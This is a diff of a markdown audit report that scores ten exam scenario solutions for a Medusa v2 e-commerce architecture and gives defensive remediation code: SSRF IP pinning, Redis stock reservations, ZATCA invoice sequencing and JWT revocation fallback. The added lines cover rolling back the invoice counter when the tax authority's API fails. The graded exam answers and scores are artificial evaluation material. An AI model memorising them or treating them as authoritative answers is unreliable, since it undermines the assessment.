-**Calibrated Competency Score**: **7.4 / 10**
-
-### 1. Executive Summary & Audit Mandate
-An unsparing technical critique was conducted on the 10 exam scenario solutions and ADR-001. While the architectural foundation (Medusa v2 Modular Monolith) is structurally sound, the proposed solutions contained 5 critical edge-case vulnerabilities and operational blind spots that must be remediated.
-
-### 2. Scenario-by-Scenario Evaluation & Scores
-
-| Scenario | Focus | Score | Security | Medusa v2 | Evaluator Verdict & Critique |
-| :--- | :--- | :---: | :---: | :---: | :--- |
-| **01 (TRAP 1)** | BOLA/IDOR in Order Retrieval | **7.5 / 10** | Medium | Medium | In-memory filtering instead of query-level scoping; breaks guest checkouts and admin context. |
-| **02 (TRAP 2)** | Checkout Split-Brain / Distributed Tx | **7.5 / 10** | High | High | Lacks compensation retry DLQ; unhandled 3DS race conditions with reconciliation cron. |
-| **03** | Bounded Context & Customizer Module | **8.0 / 10** | High | Excellent | Clean Module Link usage; but ignores how `additional_fee` integrates with Cart/Pricing workflows. |
-| **04** | SSRF in CMS Page Builder | **6.5 / 10** | Low | High | **Critical Security Flaw**: Vulnerable to DNS Rebinding TOCTOU and HTTP 302 Redirect SSRF bypass. |
-| **05** | Deadlocks & Flash Sale Concurrency | **7.0 / 10** | Medium | Good | **Critical Operational Flaw**: Redis stock decrement leaks inventory permanently on cart abandonment; async master-replica failover causes overselling. |
-| **06** | Idempotency & Saudi ZATCA E-Invoicing | **6.0 / 10** | High | Medium | **Regulatory Failure**: Locks only per `orderId`; fails ZATCA Phase 2 unbroken sequential counter (`ICV`) and previous hash (`PIH`) chain requirements. Collisions in `hashtext()`. Drops failed lock jobs silently. |
-| **07** | Zero-Downtime Database Migrations | **9.0 / 10** | High | Excellent | Exemplary Expand/Contract implementation; should specify chunked keyset batching during backfill. |
-| **08** | Stale JWT Token Invalidation | **7.0 / 10** | Medium | Good | Cache-miss in Redis evaluates to `Number(null) === 0`, locking out all legitimate users; Redis SPOF read amplification. |
-| **09** | Workflow Compensation Handlers | **8.0 / 10** | High | Excellent | Correct Medusa `StepResponse` compensation pattern; needs idempotent compensation transactions. |
-| **10** | Supply-Chain & Plugin Sandboxing | **7.5 / 10** | Medium | Good | `ignore-scripts=true` breaks native compiled modules (`sharp`, `libvips`); does not mitigate runtime malicious code execution. |
-
----
-
-## Part III: Remediations for the 5 Critical Audit Findings
-
-### Remediation 1: Socket-Level SSRF Pinning & Anti-Redirect (Scenario 4)
-* **Problem**: DNS rebinding TOCTOU vulnerability in `validateSafeUrl` and unhandled HTTP 302 redirects.
-* **Engineered Fix**: Implement socket-level IP connection pinning via custom HTTP dispatcher:
-  ```typescript
-  import { Agent, Dispatcher } from "undici";
-  import dns from "node:dns/promises";
-  import ipaddr from "ipaddr.js";
-
-  export function createSsrfProtectedDispatcher(): Dispatcher {
-    return new Agent({
-      connect: {
-        lookup: async (hostname, options, callback) => {
-          try {
-            const [address] = await dns.resolve4(hostname);
-            const ip = ipaddr.parse(address);
-            if (["private", "loopback", "linkLocal", "uniqueLocal", "carrierGradeNat"].includes(ip.range())) {
-              return callback(new Error("Access to internal/private IP space is blocked"), null as any, 4);
-            }
-            callback(null, address, 4);
-          } catch (err) {
-            callback(err as Error, null as any, 4);
-          }
-        },
-      },
-      maxRedirections: 0, // Disallow automatic HTTP 301/302 redirects
-    });
-  }
-  ```
-
-### Remediation 2: Two-Phase Redis Stock Allocation with TTL (Scenario 5)
-* **Problem**: Raw `DECR` permanently drains available stock when shoppers abandon carts.
-* **Engineered Fix**: Replace raw decrement with sliding TTL-backed stock reservations:
-  ```lua
-  -- Atomic reservation with 10-minute hold TTL
-  local stockKey = KEYS[1]
-  local reservationHash = KEYS[2]
-  local resId = ARGV[1]
-  local qty = tonumber(ARGV[2])
-  local ttl = tonumber(ARGV[3])
-
-  local available = tonumber(redis.call('get', stockKey) or "0")
-  if available >= qty then
-    redis.call('decrby', stockKey, qty)
-    redis.call('hset', reservationHash, resId, qty)
-    redis.call('expire', reservationHash, ttl)
-    return 1
-  else
-    return 0
-  end
-  ```
-  A background sweeper script releases expired reservations back to `stockKey` if checkout is not finalized.
-
-### Remediation 3: Sequential ZATCA EGS Queue with Unbroken Hash Chaining (Scenario 6)
-* **Problem**: Locking per `orderId` allows concurrent workers to break ZATCA Phase 2 sequential counter (`ICV`) and previous invoice hash (`PIH`) chaining.
-* **Engineered Fix**:
-  1. Route all ZATCA generation jobs through a dedicated BullMQ sequential queue (`concurrency: 1`) partitioned by EGS Cryptographic Stamp ID (`egs_id`).
-  2. Perform invoice generation within an exclusive database transaction on the EGS device sequence:
-     ```sql
-     -- Atomic sequential increment preserving unbroken sequence and hash chain
-     SELECT id, last_invoice_counter, last_invoice_hash 
-     FROM zatca_egs_devices 
-     WHERE id = :egs_id 
-     FOR UPDATE;
-     ```
-  3. Never drop jobs silently: If a lock fails, throw an error to allow BullMQ to retry with exponential backoff.
-
-### Remediation 4: Resilient JWT Invalidation with PostgreSQL Fallback (Scenario 8)
-* **Problem**: Redis cache miss evaluates `Number(null) === 0`, incorrectly invalidating all users with `token_version >= 1`.
-* **Engineered Fix**:
-  ```typescript
-  let currentVersionStr = await redis.get(`customer:${decoded.sub}:token_version`);
-  if (currentVersionStr === null) {
-    // Cache miss: Fallback to authoritative PostgreSQL customer record
-    const customer = await customerService.retrieve(decoded.sub, { select: ["id", "token_version"] });
-    if (!customer) throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "User not found");
-    currentVersionStr = String(customer.token_version ?? 0);
-    // Repopulate cache with 1-hour TTL
-    await redis.setex(`customer:${decoded.sub}:token_version`, 3600, currentVersionStr);
-  }
-  if (decoded.token_version !== Number(currentVersionStr)) {
-    throw new MedusaError(MedusaError.Types.UNAUTHORIZED, "Session revoked. Please login again.");
-  }
-  ```
-
-### Remediation 5: Transactional Outbox Pattern for Dual-Write Consistency (ADR-001 Update)
-* **Problem**: Committing an order in PostgreSQL while Redis event emission fails leads to silent event loss.
-* **Engineered Fix**: Implement the Transactional Outbox pattern:
-  * In the checkout transaction, insert a record into `outbox_events (id, topic, payload, created_at, status='pending')`.
-  * A lightweight reliable publisher polls or uses Postgres CDC (Logical Replication / LISTEN-NOTIFY) to stream events to Redis with guaranteed at-least-once delivery.
+* **Problem**: An order is placed and the invoice generation worker runs. The worker contacts the tax authority API, but the authority returns `HTTP 500`. The worker has already incremented the local sequential counter (`ICV = 42`). If the worker blindly retries with a new sequence, `ICV = 43` will be used, leaving sequence `42` missing and breaking the regulatory audit trail.
+* **Solution**:
+  1. **Transactional Sequence Increment**: The sequence counter `last_icv` must only be committed to the database in the *exact same transaction* that saves the certified invoice XML.
+  2. If the API call fails, the database transaction rolls back, reverting `last_icv` to `41`.
+  3. The next worker retry re-reads `last_icv = 41`, attempts generation with `ICV = 42`, and preserves the unbroken sequential chain.
